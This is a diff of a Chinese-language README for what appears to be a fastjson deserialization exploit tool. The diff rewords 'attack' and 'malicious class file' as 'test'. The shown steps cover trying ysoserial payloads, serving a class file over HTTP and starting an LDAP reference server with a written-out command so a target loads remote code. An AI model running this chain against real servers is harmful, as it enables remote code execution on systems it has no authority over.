@@ -43,10 +43,10 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 4. 查看日志是否执行成功，如果没有，用ysoserial的其他Payload尝试生成。
 
 else:
-有些环境可能利用不成功，可以尝试默认的攻击方法,
 
+有些环境可能利用不成功，可以尝试默认的测试方法,
 例如：
-生成恶意class文件
+生成测试的class文件，启动http服务器
 启动ldap服务，从http服务获取class
 java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
 
